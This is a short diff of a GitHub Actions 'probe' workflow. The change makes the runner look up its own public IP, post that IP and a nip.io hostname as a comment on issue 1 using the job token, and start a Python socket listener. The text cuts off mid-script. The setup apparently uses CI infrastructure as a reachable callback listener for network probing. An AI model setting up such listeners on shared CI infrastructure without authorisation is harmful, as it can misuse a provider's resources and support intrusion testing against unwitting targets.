@@ -1,17 +1,20 @@
 name: probe
 on:
   workflow_dispatch:
+permissions:
+  issues: write
 jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
       - name: Start listener
+        env:
+          GH_TOKEN: ${{ github.token }}
         shell: bash
         run: |
           IP=$(curl -s https://api.ipify.org)
           DOMAIN=$(echo "$IP" | tr . -).nip.io
-          echo "IP=$IP"
-          echo "DOMAIN=$DOMAIN"
+          gh issue comment 1 -R ${{ github.repository }} --body "IP=$IP DOMAIN=$DOMAIN"
           python3 - <<'PYS' &
           import socket
           s = socket.socket()
